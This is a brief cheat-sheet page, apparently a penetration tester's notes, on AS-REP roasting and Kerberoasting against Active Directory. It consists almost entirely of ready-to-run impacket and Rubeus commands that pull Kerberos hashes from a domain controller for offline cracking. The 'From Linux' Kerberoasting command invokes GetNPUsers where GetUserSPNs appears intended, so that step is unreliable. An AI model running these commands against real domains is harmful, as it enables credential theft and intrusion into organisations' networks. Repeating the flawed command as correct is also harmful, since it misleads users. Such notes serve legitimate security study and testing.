---
title: "Kerberoasting"
date: 2024-7-6
tags: ["as_rep roasting", "impacket", "active directory", "ad", "domain controller", "Windows", "kerberoasting", "GetNPUsers", "faketime"]
---

---
### AS_REP Roasting

```bash
impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10
```

### Kerberoasting (From Linux)

```bash
faketime -f +8h impacket-GetNPUsers -request 'example.com/user:password' -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt
```

<small>*Note: Times skew have to be within 5 minutes in kerberos*</small>

### Kerberoasting (From Windows)

```cmd
.\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password
```


<br>